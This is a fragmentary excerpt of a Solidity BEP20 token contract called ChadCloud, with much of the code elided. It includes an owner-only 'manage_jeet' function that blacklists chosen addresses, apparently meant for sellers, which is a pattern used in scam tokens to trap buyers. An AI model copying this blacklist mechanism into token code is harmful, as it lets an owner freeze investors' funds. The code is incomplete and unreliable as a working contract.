...
contract ChadCloud is IBEP20, Auth {
    ...
    string constant _name = "ChadCloud";
    string constant _symbol = "ChadCloud";
    ...
    address public marketingFeeReceiver = 0x45B0cBC62516E9360Bca8E96a112Ba0B7DD5faF9;
    ...
    uint256 public swapThreshold = _totalSupply / 10000 * 55; // 0.55%
    bool inSwap;
   ...
   function setMaxWallet(uint256 amount) external onlyOwner {
    ...
    function manage_jeet(address[] calldata addresses, bool status) public onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            isblacklisted[addresses[i]] = status;
        }
    }

    function manage_money(address[] calldata addresses, bool status) public onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
